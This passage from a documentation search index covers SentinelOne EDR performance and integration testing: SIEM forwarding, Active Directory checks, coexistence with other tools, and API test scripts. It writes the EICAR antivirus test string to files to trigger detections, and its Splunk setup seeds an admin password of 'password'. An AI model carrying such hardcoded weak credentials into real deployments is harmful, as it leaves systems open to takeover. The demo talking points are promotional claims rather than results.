Metrics","text":""},{"location":"testing/kategori-e-performance/#key-performance-indicators","title":"Key Performance Indicators","text":"Metric Category Baseline Target With SentinelOne Target Acceptable Impact CPU Usage &lt;20% &lt;25% &lt;5% increase Memory Usage Baseline Baseline + 500MB &lt;10% of total RAM Disk I/O Baseline &gt;90% of baseline &lt;10% degradation Network Latency Baseline &lt;10ms additional &lt;5% increase App Response Time Baseline &lt;20% increase &lt;15% degradation"},{"location":"testing/kategori-e-performance/#validation-checklist","title":"Validation Checklist","text":""},{"location":"testing/kategori-e-performance/#resource-usage-validation","title":"Resource Usage Validation","text":"<ul> <li>[ ] CPU Impact: &lt;5% additional CPU usage under normal load</li> <li>[ ] Memory Footprint: &lt;500MB total memory usage</li> <li>[ ] Disk Usage: &lt;2GB storage consumption</li> <li>[ ] Network Overhead: &lt;5% additional network traffic</li> <li>[ ] Boot Impact: &lt;10 seconds additional boot time</li> </ul>"},{"location":"testing/kategori-e-performance/#application-performance-validation","title":"Application Performance Validation","text":"<ul> <li>[ ] Database Performance: &lt;10% query time increase</li> <li>[ ] Web Applications: &lt;15% response time increase</li> <li>[ ] File Operations: &lt;10% I/O performance impact</li> <li>[ ] Network Services: &lt;5% throughput reduction</li> <li>[ ] System Responsiveness: No noticeable UI lag</li> </ul>"},{"location":"testing/kategori-e-performance/#demo-presentation-points","title":"Demo Presentation Points","text":""},{"location":"testing/kategori-e-performance/#executive-summary","title":"Executive Summary","text":"<ol> <li>\"Minimal Performance Impact\"</li> <li>Less than 5% CPU overhead under normal operations</li> <li>Memory footprint under 500MB</li> <li> <p>No noticeable impact on user experience</p> </li> <li> <p>\"Optimized for Production\"</p> </li> <li>Designed for 24/7 server environments</li> <li>Efficient resource utilization</li> <li> <p>Scales with system capabilities</p> </li> <li> <p>\"Performance vs Security Balance\"</p> </li> <li>Maximum protection with minimal impact</li> <li>Intelligent resource management</li> <li>Priority given to critical system functions</li> </ol>"},{"location":"testing/kategori-e-performance/#technical-demonstrations","title":"Technical Demonstrations","text":"<ul> <li>Real-time resource monitoring during various workloads</li> <li>Before/after performance comparisons</li> <li>Application response time measurements</li> <li>System stress testing with SentinelOne active</li> </ul>"},{"location":"testing/kategori-e-performance/#next-steps","title":"Next Steps","text":"<p>Complete the testing framework with: - Kategori F: Integration Testing - Windows Server Specific Testing - Linux Server Specific Testing</p> <p>Performance Validated</p> <p>Kategori E testing proves that SentinelOne delivers enterprise-grade security without compromising system performance, crucial for business continuity arguments.</p>"},{"location":"testing/kategori-f-integration/","title":"Kategori F: Integration Testing","text":""},{"location":"testing/kategori-f-integration/#overview","title":"Overview","text":"<p>Testing komprehensif kemampuan integrasi SentinelOne EDR dengan sistem enterprise, aplikasi third-party, dan infrastruktur IT existing. Validasi interoperability dan compatibility untuk deployment seamless di environment production.</p>"},{"location":"testing/kategori-f-integration/#f1-siem-integration","title":"\ud83d\udd04 F1: SIEM Integration","text":""},{"location":"testing/kategori-f-integration/#tujuan-testing","title":"Tujuan Testing","text":"<p>Memvalidasi kemampuan SentinelOne mengirim logs, alerts, dan telemetry data ke SIEM platforms untuk centralized security monitoring dan analysis.</p>"},{"location":"testing/kategori-f-integration/#test-scenarios","title":"Test Scenarios","text":""},{"location":"testing/kategori-f-integration/#f11-splunk-integration-testing","title":"F1.1: Splunk Integration Testing","text":"<p>Splunk Configuration: <pre><code># Configure Splunk Universal Forwarder untuk SentinelOne logs\necho \"=== SPLUNK INTEGRATION TESTING ===\"\n\n# Install Splunk Universal Forwarder (if not installed)\nwget -O splunkforwarder.tgz \"https://download.splunk.com/products/universalforwarder/releases/9.1.0/linux/splunkforwarder-9.1.0-linux-2.6-x86_64.tgz\"\nsudo tar xzf splunkforwarder.tgz -C /opt/\nsudo /opt/splunkforwarder/bin/splunk start --accept-license --answer-yes --no-prompt --seed-passwd password\n\n# Configure inputs for SentinelOne logs\nsudo tee /opt/splunkforwarder/etc/system/local/inputs.conf &lt;&lt; EOF\n[monitor:///var/log/sentinelone/*.log]\ndisabled = false\nindex = sentinelone\nsourcetype = sentinelone:log\n\n[monitor:///var/log/sentinelone/agent.log]\ndisabled = false\nindex = sentinelone\nsourcetype = sentinelone:agent\n\n[udp://514]\ndisabled = false\nindex = sentinelone\nsourcetype = syslog\nEOF\n\n# Configure outputs to Splunk indexer\nsudo tee /opt/splunkforwarder/etc/system/local/outputs.conf &lt;&lt; EOF\n[tcpout]\ndefaultGroup = default-autolb-group\n\n[tcpout:default-autolb-group]\nserver = splunk-indexer:9997\nEOF\n\n# Restart forwarder\nsudo /opt/splunkforwarder/bin/splunk restart\n</code></pre></p> <p>Integration Validation: <pre><code>#!/bin/bash\necho \"=== VALIDATING SPLUNK INTEGRATION ===\"\n\n# Generate test events\necho \"Generating SentinelOne test events...\"\n\n# Create test EICAR file to trigger alerts\necho 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' &gt; /tmp/splunk_test_eicar.txt\n\n# Wait for detection and logging\nsleep 30\n\n# Check if logs are being generated\nif [ -f \"/var/log/sentinelone/agent.log\" ]; then\n    echo \"\u2705 SentinelOne logs found\"\n    tail -10 /var/log/sentinelone/agent.log\nelse\n    echo \"\u274c SentinelOne logs not found\"\nfi\n\n# Verify Splunk forwarder is sending data\nsudo /opt/splunkforwarder/bin/splunk list forward-server\n\n# Test Splunk search (requires Splunk credentials)\n# curl -k -u admin:password \"https://splunk-server:8089/services/search/jobs\" -d search=\"search index=sentinelone sourcetype=sentinelone:agent | head 10\"\n</code></pre></p>"},{"location":"testing/kategori-f-integration/#f12-elk-stack-integration","title":"F1.2: ELK Stack Integration","text":"<p>Logstash Configuration: <pre><code># /etc/logstash/conf.d/sentinelone.conf\ninput {\n  file {\n    path =&gt; \"/var/log/sentinelone/*.log\"\n    type =&gt; \"sentinelone\"\n    start_position =&gt; \"beginning\"\n  }\n\n  syslog {\n    port =&gt; 5514\n    type =&gt; \"sentinelone-syslog\"\n  }\n}\n\nfilter {\n  if [type] == \"sentinelone\" {\n    grok {\n      match =&gt; { \n        \"message\" =&gt; \"%{TIMESTAMP_ISO8601:timestamp} %{LOGLEVEL:level} %{DATA:component} %{GREEDYDATA:message}\" \n      }\n    }\n\n    date {\n      match =&gt; [ \"timestamp\", \"ISO8601\" ]\n    }\n  }\n\n  if [type] == \"sentinelone-syslog\" {\n    mutate {\n      add_field =&gt; { \"source\" =&gt; \"sentinelone-siem\" }\n    }\n  }\n}\n\noutput {\n  elasticsearch {\n    hosts =&gt; [\"elasticsearch:9200\"]\n    index =&gt; \"sentinelone-%{+YYYY.MM.dd}\"\n  }\n\n  stdout {\n    codec =&gt; rubydebug\n  }\n}\n</code></pre></p> <p>ELK Integration Test: <pre><code>#!/bin/bash\necho \"=== ELK STACK INTEGRATION TESTING ===\"\n\n# Start ELK services\nsudo systemctl start elasticsearch\nsudo systemctl start logstash\nsudo systemctl start kibana\n\n# Verify services\nfor service in elasticsearch logstash kibana; do\n    if systemctl is-active --quiet $service; then\n        echo \"\u2705 $service is running\"\n    else\n        echo \"\u274c $service is not running\"\n    fi\ndone\n\n# Test Elasticsearch connection\ncurl -X GET \"localhost:9200/_cluster/health?pretty\"\n\n# Generate test event\necho 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' &gt; /tmp/elk_test_eicar.txt\n\n# Wait for processing\nsleep 60\n\n# Query Elasticsearch for SentinelOne data\ncurl -X GET \"localhost:9200/sentinelone-*/_search?pretty\" -H 'Content-Type: application/json' -d'\n{\n  \"query\": {\n    \"match\": {\n      \"message\": \"eicar\"\n    }\n  },\n  \"size\": 5\n}'\n</code></pre></p>"},{"location":"testing/kategori-f-integration/#f13-ibm-qradar-integration","title":"F1.3: IBM QRadar Integration","text":"<p>QRadar DSM Configuration: <pre><code>#!/bin/bash\necho \"=== IBM QRADAR INTEGRATION TESTING ===\"\n\n# Configure syslog forwarding to QRadar\nsudo tee -a /etc/rsyslog.conf &lt;&lt; EOF\n# SentinelOne to QRadar\n*.* @@qradar-server:514\nEOF\n\n# Restart syslog\nsudo systemctl restart rsyslog\n\n# Configure SentinelOne to send syslog\n# Note: This typically requires SentinelOne console configuration\n# Test syslog connectivity\necho \"Testing syslog connectivity to QRadar...\"\nlogger -p local0.info \"SentinelOne Integration Test - $(date)\"\n\n# Verify QRadar is receiving logs\n# This requires QRadar CLI access or API calls\necho \"Verify in QRadar console that logs are being received\"\n</code></pre></p>"},{"location":"testing/kategori-f-integration/#f2-active-directory-integration","title":"\ud83c\udfe2 F2: Active Directory Integration","text":""},{"location":"testing/kategori-f-integration/#tujuan-testing_1","title":"Tujuan Testing","text":"<p>Testing integrasi SentinelOne dengan Active Directory untuk user authentication, group policy, dan centralized management.</p>"},{"location":"testing/kategori-f-integration/#test-scenarios_1","title":"Test Scenarios","text":""},{"location":"testing/kategori-f-integration/#f21-domain-authentication","title":"F2.1: Domain Authentication","text":"<p>Windows Domain Integration: <pre><code>Write-Host \"=== ACTIVE DIRECTORY INTEGRATION TESTING ===\"\n\n# Verify domain membership\n$computerInfo = Get-ComputerInfo\nWrite-Host \"Computer Name: $($computerInfo.CsName)\"\nWrite-Host \"Domain: $($computerInfo.CsDomain)\"\nWrite-Host \"Workgroup: $($computerInfo.CsWorkgroup)\"\n\nif($computerInfo.CsDomain) {\n    Write-Host \"\u2705 Computer is domain-joined to: $($computerInfo.CsDomain)\"\n} else {\n    Write-Host \"\u274c Computer is not domain-joined\"\n}\n\n# Test domain connectivity\n$domainController = (Get-ADDomainController -Discover).HostName\nif($domainController) {\n    Write-Host \"\u2705 Domain Controller accessible: $domainController\"\n\n    # Test LDAP connectivity\n    try {\n        $searcher = [System.DirectoryServices.DirectorySearcher]::new()\n        $searcher.Filter = \"(&amp;(objectClass=computer)(name=$env:COMPUTERNAME))\"\n        $result = $searcher.FindOne()\n        if($result) {\n            Write-Host \"\u2705 Computer account found in AD\"\n        }\n    }\n    catch {\n        Write-Host \"\u274c LDAP query failed: $($_.Exception.Message)\"\n    }\n} else {\n    Write-Host \"\u274c Cannot locate domain controller\"\n}\n\n# Test SentinelOne service account (if configured)\n$sentinelServices = Get-Service -Name \"*Sentinel*\"\nforeach($service in $sentinelServices) {\n    $serviceAccount = (Get-WmiObject Win32_Service | Where-Object {$_.Name -eq $service.Name}).StartName\n    Write-Host \"Service $($service.Name) runs as: $serviceAccount\"\n}\n</code></pre></p>"},{"location":"testing/kategori-f-integration/#f22-group-policy-integration","title":"F2.2: Group Policy Integration","text":"<p>GPO Testing: <pre><code># Test Group Policy application\nWrite-Host \"=== GROUP POLICY INTEGRATION TESTING ===\"\n\n# Get applied GPOs\n$appliedGPOs = Get-WmiObject -Class Win32_ComputerSystemProduct | ForEach-Object {\n    gpresult /r /scope:computer\n}\n\n# Check for SentinelOne specific policies\n$sentinelPolicies = gpresult /r | Select-String -Pattern \"SentinelOne\"\nif($sentinelPolicies) {\n    Write-Host \"\u2705 SentinelOne Group Policies found:\"\n    $sentinelPolicies | ForEach-Object { Write-Host \"  - $($_.Line.Trim())\" }\n} else {\n    Write-Host \"\u26a0\ufe0f  No SentinelOne-specific Group Policies found\"\n}\n\n# Test policy refresh\ngpupdate /force\nWrite-Host \"\u2705 Group Policy refresh completed\"\n</code></pre></p>"},{"location":"testing/kategori-f-integration/#f23-user-context-testing","title":"F2.3: User Context Testing","text":"<p>User Authentication Integration: <pre><code># Test user context and permissions\nWrite-Host \"=== USER CONTEXT TESTING ===\"\n\n# Current user information\n$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()\nWrite-Host \"Current User: $($currentUser.Name)\"\nWrite-Host \"Authentication Type: $($currentUser.AuthenticationType)\"\nWrite-Host \"Is Authenticated: $($currentUser.IsAuthenticated)\"\n\n# Group memberships\n$userGroups = ([System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | ForEach-Object { $_.Translate([System.Security.Principal.NTAccount]) }) -join \", \"\nWrite-Host \"Group Memberships: $userGroups\"\n\n# Test SentinelOne user permissions\ntry {\n    $sentinelStatus = sentinelctl status\n    Write-Host \"\u2705 SentinelOne status accessible to current user\"\n} catch {\n    Write-Host \"\u274c SentinelOne access denied for current user\"\n}\n</code></pre></p>"},{"location":"testing/kategori-f-integration/#f3-third-party-tool-compatibility","title":"\ud83d\udd0c F3: Third-party Tool Compatibility","text":""},{"location":"testing/kategori-f-integration/#tujuan-testing_2","title":"Tujuan Testing","text":"<p>Memvalidasi compatibility SentinelOne dengan security tools, monitoring systems, dan aplikasi enterprise lainnya.</p>"},{"location":"testing/kategori-f-integration/#test-scenarios_2","title":"Test Scenarios","text":""},{"location":"testing/kategori-f-integration/#f31-antivirus-compatibility","title":"F3.1: Antivirus Compatibility","text":"<p>Multiple Security Solutions Testing: <pre><code>Write-Host \"=== ANTIVIRUS COMPATIBILITY TESTING ===\"\n\n# Check for other security products\n$securityProducts = Get-WmiObject -Namespace \"root\\SecurityCenter2\" -Class AntiVirusProduct\nif($securityProducts) {\n    Write-Host \"Installed Security Products:\"\n    foreach($product in $securityProducts) {\n        $productName = $product.displayName\n        $productState = $product.productState\n        Write-Host \"- $productName (State: $productState)\"\n    }\n} else {\n    Write-Host \"No other security products detected via Security Center\"\n}\n\n# Check Windows Defender status\n$defenderStatus = Get-MpPreference\nWrite-Host \"Windows Defender Status:\"\nWrite-Host \"- Real-time Protection: $($defenderStatus.DisableRealtimeMonitoring -eq $false)\"\nWrite-Host \"- Cloud Protection: $($defenderStatus.MAPSReporting)\"\n\n# Test for conflicts\n$conflicts = @()\n\n# Check for process conflicts\n$securityProcesses = @(\"MsMpEng\", \"NisSrv\", \"avgnt\", \"avguix\", \"kavtray\")\nforeach($process in $securityProcesses) {\n    if(Get-Process -Name $process -ErrorAction SilentlyContinue) {\n        $conflicts += \"Process conflict detected: $process\"\n    }\n}\n\n# Check for service conflicts\n$securityServices = @(\"WinDefend\", \"SecurityHealthService\", \"Sense\")\nforeach($service in $securityServices) {\n    $svc = Get-Service -Name $service -ErrorAction SilentlyContinue\n    if($svc -and $svc.Status -eq \"Running\") {\n        Write-Host \"\u26a0\ufe0f  Potential service conflict: $service is running\"\n    }\n}\n\nif($conflicts.Count -eq 0) {\n    Write-Host \"\u2705 No obvious security product conflicts detected\"\n} else {\n    $conflicts | ForEach-Object { Write-Host \"\u274c $_\" }\n}\n</code></pre></p>"},{"location":"testing/kategori-f-integration/#f32-monitoring-tools-integration","title":"F3.2: Monitoring Tools Integration","text":"<p>SCOM/Nagios/Zabbix Integration: <pre><code>#!/bin/bash\necho \"=== MONITORING TOOLS INTEGRATION TESTING ===\"\n\n# Test SNMP integration (if configured)\nif command -v snmpwalk &amp;&gt; /dev/null; then\n    echo \"Testing SNMP integration...\"\n    snmpwalk -v2c -c public localhost 1.3.6.1.4.1.2021.10.1.3.1 2&gt;/dev/null\n    if [ $? -eq 0 ]; then\n        echo \"\u2705 SNMP responding\"\n    else\n        echo \"\u274c SNMP not responding\"\n    fi\nfi\n\n# Test WMI integration (Windows)\n# This would be PowerShell on Windows systems\n# Get-WmiObject -Class Win32_PerfRawData_PerfOS_Processor\n\n# Check system performance counters\necho \"Checking system performance counters...\"\nif [ -f \"/proc/loadavg\" ]; then\n    echo \"Load Average: $(cat /proc/loadavg)\"\nfi\n\nif [ -f \"/proc/meminfo\" ]; then\n    echo \"Memory Usage: $(grep MemAvailable /proc/meminfo)\"\nfi\n\n# Test custom monitoring scripts\ncat &gt; /tmp/sentinelone_monitor.sh &lt;&lt; 'EOF'\n#!/bin/bash\n# Custom monitoring script for SentinelOne\n\n# Check agent status\nif pgrep -f sentinelone-agent &gt; /dev/null; then\n    echo \"SENTINEL_AGENT_STATUS:OK\"\nelse\n    echo \"SENTINEL_AGENT_STATUS:CRITICAL\"\nfi\n\n# Check agent connectivity\nif sudo /opt/sentinelone/bin/sentinelctl status | grep -q \"Connected\"; then\n    echo \"SENTINEL_CONNECTIVITY:OK\"\nelse\n    echo \"SENTINEL_CONNECTIVITY:WARNING\"\nfi\n\n# Check resource usage\nMEMORY_USAGE=$(ps aux | grep sentinelone | awk '{sum+=$6} END {print sum/1024}')\necho \"SENTINEL_MEMORY_MB:$MEMORY_USAGE\"\n\nCPU_USAGE=$(ps aux | grep sentinelone | awk '{sum+=$3} END {print sum}')\necho \"SENTINEL_CPU_PERCENT:$CPU_USAGE\"\nEOF\n\nchmod +x /tmp/sentinelone_monitor.sh\n/tmp/sentinelone_monitor.sh\n</code></pre></p>"},{"location":"testing/kategori-f-integration/#f33-backup-software-compatibility","title":"F3.3: Backup Software Compatibility","text":"<p>Backup Integration Testing: <pre><code># Test backup software compatibility\nWrite-Host \"=== BACKUP SOFTWARE COMPATIBILITY TESTING ===\"\n\n# Check for common backup software\n$backupSoftware = @(\n    @{Name=\"Veeam Agent\"; Process=\"VeeamAgent\"; Service=\"VeeamAgentWin_x64\"},\n    @{Name=\"Acronis\"; Process=\"AcronisAgent\"; Service=\"AcrSch2Svc\"},\n    @{Name=\"Windows Backup\"; Process=\"sdclt\"; Service=\"SDRSVC\"},\n    @{Name=\"Commvault\"; Process=\"cvd\"; Service=\"CommVault\"}\n)\n\nforeach($software in $backupSoftware) {\n    $process = Get-Process -Name $software.Process -ErrorAction SilentlyContinue\n    $service = Get-Service -Name $software.Service -ErrorAction SilentlyContinue\n\n    if($process -or ($service -and $service.Status -eq \"Running\")) {\n        Write-Host \"\u2705 $($software.Name) detected and running\"\n\n        # Test file backup with SentinelOne running\n        $testFile = \"C:\\temp\\backup_test_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt\"\n        \"This is a backup compatibility test file.\" | Out-File $testFile\n\n        Start-Sleep 2\n\n        # Simulate backup operation\n        Copy-Item $testFile \"C:\\temp\\backup_copy.txt\"\n\n        if(Test-Path \"C:\\temp\\backup_copy.txt\") {\n            Write-Host \"\u2705 File backup operation successful with SentinelOne active\"\n            Remove-Item \"C:\\temp\\backup_copy.txt\" -Force\n        } else {\n            Write-Host \"\u274c File backup operation failed\"\n        }\n\n        Remove-Item $testFile -Force\n    } else {\n        Write-Host \"\u26aa $($software.Name) not detected\"\n    }\n}\n\n# Test Volume Shadow Copy Service\n$vssService = Get-Service -Name \"VSS\" -ErrorAction SilentlyContinue\nif($vssService -and $vssService.Status -eq \"Running\") {\n    Write-Host \"\u2705 Volume Shadow Copy Service is running\"\n\n    # Test VSS snapshot creation\n    try {\n        $vssOutput = vssadmin list shadows\n        Write-Host \"\u2705 VSS snapshots accessible\"\n    } catch {\n        Write-Host \"\u274c VSS snapshot access failed: $($_.Exception.Message)\"\n    }\n} else {\n    Write-Host \"\u274c Volume Shadow Copy Service not running\"\n}\n</code></pre></p>"},{"location":"testing/kategori-f-integration/#f4-api-functionality","title":"\ud83c\udf10 F4: API Functionality","text":""},{"location":"testing/kategori-f-integration/#tujuan-testing_3","title":"Tujuan Testing","text":"<p>Testing SentinelOne API integration untuk automation, custom scripts, dan third-party application integration.</p>"},{"location":"testing/kategori-f-integration/#test-scenarios_3","title":"Test Scenarios","text":""},{"location":"testing/kategori-f-integration/#f41-rest-api-testing","title":"F4.1: REST API Testing","text":"<p>API Authentication and Basic Operations: <pre><code>#!/usr/bin/env python3\n\"\"\"\nSentinelOne REST API Integration Testing\n\"\"\"\nimport requests\nimport json\nfrom datetime import datetime, timedelta\n\nclass SentinelOneAPITest:\n    def __init__(self, console_url, api_token):\n        self.base_url = console_url\n        self.headers = {\n            'Authorization': f'ApiToken {api_token}',\n            'Content-Type': 'application/json'\n        }\n        self.session = requests.Session()\n        self.session.headers.update(self.headers)\n\n    def test_authentication(self):\n        \"\"\"Test API authentication\"\"\"\n        print(\"=== API AUTHENTICATION TEST ===\")\n        try:\n            response = self.session.get(f'{self.base_url}/web/api/v2.1/users/me')\n            if response.status_code == 200:\n                user_info = response.json()\n                print(f\"\u2705 Authentication successful\")\n                print(f\"   User: {user_info.get('data', {}).get('email', 'Unknown')}\")\n                return True\n            else:\n                print(f\"\u274c Authentication failed: {response.status_code}\")\n                return False\n        except Exception as e:\n            print(f\"\u274c Authentication error: {str(e)}\")\n            return False\n\n    def test_agents_endpoint(self):\n        \"\"\"Test agents endpoint\"\"\"\n        print(\"=== AGENTS ENDPOINT TEST ===\")\n        try:\n            response = self.session.get(f'{self.base_url}/web/api/v2.1/agents')\n            if response.status_code == 200:\n                agents_data = response.json()\n                agent_count = agents_data.get('pagination', {}).get('totalItems', 0)\n                print(f\"\u2705 Agents endpoint accessible\")\n                print(f\"   Total agents: {agent_count}\")\n\n                # Test specific agent details\n                if agent_count &gt; 0:\n                    agents = agents_data.get('data', [])\n                    first_agent = agents[0]\n                    agent_id = first_agent.get('id')\n\n                    # Get detailed agent info\n                    agent_response = self.session.get(f'{self.base_url}/web/api/v2.1/agents/{agent_id}')\n                    if agent_response.status_code == 200:\n                        print(f\"\u2705 Agent details retrieved for ID: {agent_id}\")\n                    else:\n                        print(f\"\u274c Failed to get agent details: {agent_response.status_code}\")\n\n                return True\n            else:\n                print(f\"\u274c Agents endpoint failed: {response.status_code}\")\n                return False\n        except Exception as e:\n            print(f\"\u274c Agents endpoint error: {str(e)}\")\n            return False\n\n    def test_threats_endpoint(self):\n        \"\"\"Test threats endpoint\"\"\"\n        print(\"=== THREATS ENDPOINT TEST ===\")\n        try:\n            # Get threats from last 24 hours\n            since = (datetime.now() - timedelta(days=1)).isoformat() + 'Z'\n            params = {\n                'createdAt__gte': since,\n                'limit': 10\n            }\n\n            response = self.session.get(f'{self.base_url}/web/api/v2.1/threats', params=params)\n            if response.status_code == 200:\n                threats_data = response.json()\n                threat_count = threats_data.get('pagination', {}).get('totalItems', 0)\n                print(f\"\u2705 Threats endpoint accessible\")\n                print(f\"   Threats in last 24h: {threat_count}\")\n                return True\n            else:\n                print(f\"\u274c Threats endpoint failed: {response.status_code}\")\n                return False\n        except Exception as e:\n            print(f\"\u274c Threats endpoint error: {str(e)}\")\n            return False\n\n    def test_activities_endpoint(self):\n        \"\"\"Test activities endpoint\"\"\"\n        print(\"=== ACTIVITIES ENDPOINT TEST ===\")\n        try:\n            params = {\n                'limit': 5,\n                'sortBy': 'createdAt',\n                'sortOrder': 'desc'\n            }\n\n            response = self.session.get(f'{self.base_url}/web/api/v2.1/activities', params=params)\n            if response.status_code == 200:\n                activities_data = response.json()\n                activity_count = activities_data.get('pagination', {}).get('totalItems', 0)\n                print(f\"\u2705 Activities endpoint accessible\")\n                print(f\"   Recent activities: {activity_count}\")\n                return True\n            else:\n                print(f\"\u274c Activities endpoint failed: {response.status_code}\")\n                return False\n        except Exception as e:\n            print(f\"\u274c Activities endpoint error: {str(e)}\")\n            return False\n\n    def run_all_tests(self):\n        \"\"\"Run all API tests\"\"\"\n        print(\"Starting SentinelOne API Integration Tests\")\n        print(\"=\" * 50)\n\n        tests = [\n            self.test_authentication,\n            self.test_agents_endpoint,\n            self.test_threats_endpoint,\n            self.test_activities_endpoint\n        ]\n\n        passed = 0\n        total = len(tests)\n\n        for test in tests:\n            if test():\n                passed += 1\n            print()\n\n        print(\"=\" * 50)\n        print(f\"API Tests completed: {passed}/{total} passed\")\n        return passed == total\n\n# Usage example:\nif __name__ == \"__main__\":\n    # Configuration (replace with actual values)\n    CONSOLE_URL = \"https://your-sentinelone-console.com\"\n    API_TOKEN = \"your-api-token-here\"\n\n    tester = SentinelOneAPITest(CONSOLE_URL, API_TOKEN)\n    success = tester.run_all_tests()\n\n    exit(0 if success else 1)\n</code></pre></p>"},{"location":"testing/kategori-f-integration/#f42-powershell-api-integration","title":"F4.2: PowerShell API Integration","text":"<p>PowerShell API Client: <pre><code># SentinelOne PowerShell API Testing\nparam(\n    [string]$ConsoleUrl = \"https://your-console.sentinelone.net\",\n    [string]$ApiToken = \"your-api-token\"\n)\n\nWrite-Host \"=== SENTINELONE POWERSHELL API TESTING ===\" -ForegroundColor Cyan\n\n# Function to make API calls\nfunction Invoke-SentinelOneAPI {\n    param(\n        [string]$Endpoint,\n        [string]$Method = \"GET\",\n        [hashtable]$Body = @{},\n        [hashtable]$QueryParams = @{}\n    )\n\n    $headers = @{\n        'Authorization' = \"ApiToken $ApiToken\"\n        'Content-Type' = 'application/json'\n    }\n\n    $uri = \"$ConsoleUrl$Endpoint\"\n\n    if($QueryParams.Count -gt 0) {\n        $queryString = ($QueryParams.GetEnumerator() | ForEach-Object { \"$($_.Key)=$($_.Value)\" }) -join \"&amp;\"\n        $uri += \"?$queryString\"\n    }\n\n    try {\n        if($Method -eq \"GET\") {\n            $response = Invoke-RestMethod -Uri $uri -Headers $headers -Method $Method\n        } else {\n            $jsonBody = $Body | ConvertTo-Json -Depth 10\n            $response = Invoke-RestMethod -Uri $uri -Headers $headers -Method $Method -Body $jsonBody\n        }\n        return $response\n    }\n    catch {\n        Write-Error \"API call failed: $($_.Exception.Message)\"\n        return $null\n    }\n}\n\n# Test API authentication\nWrite-Host \"Testing API authentication...\" -ForegroundColor Yellow\n$userInfo = Invoke-SentinelOneAPI -Endpoint \"/web/api/v2.1/users/me\"\nif($userInfo) {\n    Write-Host \"\u2705 Authentication successful\" -ForegroundColor Green\n    Write-Host \"   User: $($userInfo.data.email)\" -ForegroundColor Gray\n} else {\n    Write-Host \"\u274c Authentication failed\" -ForegroundColor Red\n    exit 1\n}\n\n# Test agents endpoint\nWrite-Host \"Testing agents endpoint...\" -ForegroundColor Yellow\n$agents = Invoke-SentinelOneAPI -Endpoint \"/web/api/v2.1/agents\" -QueryParams @{limit=5}\nif($agents) {\n    Write-Host \"\u2705 Agents endpoint accessible\" -ForegroundColor Green\n    Write-Host \"   Total agents: $($agents.pagination.totalItems)\" -ForegroundColor Gray\n\n    # Display agent details\n    foreach($agent in $agents.data) {\n        Write-Host \"   - $($agent.computerName) ($($agent.osName)) - $($agent.networkStatus)\" -ForegroundColor Gray\n    }\n} else {\n    Write-Host \"\u274c Agents endpoint failed\" -ForegroundColor Red\n}\n\n# Test system status\nWrite-Host \"Testing system status...\" -ForegroundColor Yellow\n$systemStatus = Invoke-SentinelOneAPI -Endpoint \"/web/api/v2.1/system/status\"\nif($systemStatus) {\n    Write-Host \"\u2705 System status retrieved\" -ForegroundColor Green\n    Write-Host \"   Status: $($systemStatus.data.health)\" -ForegroundColor Gray\n} else {\n    Write-Host \"\u274c System status failed\" -ForegroundColor Red\n}\n\nWrite-Host \"=== API TESTING COMPLETED ===\" -ForegroundColor Cyan\n</code></pre></p>"},{"location":"testing/kategori-f-integration/#integration-testing-metrics","title":"\ud83d\udcca Integration Testing Metrics","text":""},{"location":"testing/kategori-f-integration/#key-performance-indicators","title":"Key Performance Indicators","text":"Integration Type Success Criteria Validation Method SIEM Integration 100% log forwarding Event correlation verification AD Integration Seamless authentication Domain join and policy application Third-party Compatibility No conflicts detected Coexistence testing API Functionality All endpoints accessible Automated API test suite"},{"location":"testing/kategori-f-integration/#validation-checklist","title":"Validation Checklist","text":""},{"location":"testing/kategori-f-integration/#siem-integration-validation","title":"SIEM Integration Validation","text":"<ul> <li>[ ] Log Forwarding: All security events sent to SIEM</li> <li>[ ] Format Compatibility: Logs properly parsed by SIEM</li> <li>[ ] Real-time Delivery: Events delivered within SLA timeframes</li> <li>[ ] Alert Correlation: SIEM can correlate SentinelOne data</li> <li>[ ] Dashboard Integration: Security dashboards display S1 data</li> </ul>"},{"location":"testing/kategori-f-integration/#enterprise-integration-validation","title":"Enterprise Integration Validation","text":"<ul> <li>[ ] AD Authentication: Domain users can access SentinelOne features</li> <li>[ ] Group Policy: Policies applied consistently across domain</li> <li>[ ] SSO Integration: Single sign-on works with enterprise IdP</li> <li>[ ] LDAP Queries: User/group lookups function correctly</li> <li>[ ] Certificate Management: PKI integration works properly</li> </ul>"},{"location":"testing/kategori-f-integration/#third-party-compatibility-validation","title":"Third-party Compatibility Validation","text":"<ul> <li>[ ] No Service Conflicts: All services coexist without issues</li> <li>[ ] Performance Impact: No degradation from software interactions</li> <li>[ ] Feature Compatibility: All features work with other tools</li> <li>[ ] Update Compatibility: Software updates don't cause conflicts</li> <li>[ ] Backup Operations: Backups complete successfully</li> </ul>"},{"location":"testing/kategori-f-integration/#api-integration-validation","title":"API Integration Validation","text":"<ul> <li>[ ] Authentication: API tokens work correctly</li> <li>[ ] Endpoint Accessibility: All required endpoints respond</li> <li>[ ] Data Retrieval: Can query agents, threats, activities</li> <li>[ ] Automation: Scripted operations execute successfully</li> <li>[ ] Error Handling: API errors are properly handled</li> </ul>"},{"location":"testing/kategori-f-integration/#demo-presentation-points","title":"Demo Presentation Points","text":""},{"location":"testing/kategori-f-integration/#executive-summary","title":"Executive Summary","text":"<ol> <li>\"Seamless Enterprise Integration\"</li> <li>Integrates with existing SIEM platforms</li> <li>Works within Active Directory infrastructure</li> <li> <p>Compatible with enterprise applications</p> </li> <li> <p>\"API-Driven Automation\"</p> </li> <li>Comprehensive REST API for integration</li> <li>PowerShell and Python SDK support</li> <li> <p>Custom automation capabilities</p> </li> <li> <p>\"Zero Integration Conflicts\"</p> </li> <li>Coexists with other security tools</li> <li>No backup or monitoring disruptions</li> <li>Maintains enterprise tool compatibility</li> </ol>"},{"location":"testing/kategori-f-integration/#technical-demonstrations","title":"Technical Demonstrations","text":"<ul> <li>Live SIEM integration with real-time log forwarding</li> <li>Active Directory user authentication demo</li> <li>API automation script execution</li> <li>Third-party tool coexistence validation</li> </ul>"},{"location":"testing/kategori-f-integration/#final-testing-summary","title":"Final Testing Summary","text":"<p>All six testing categories now complete:</p> <p>\u2705 Kategori A: Real-Time Protection Testing \u2705 Kategori B: Offline Scenarios Testing \u2705 Kategori C: Operational Resilience Testing \u2705 Kategori D: Security Hardening Testing 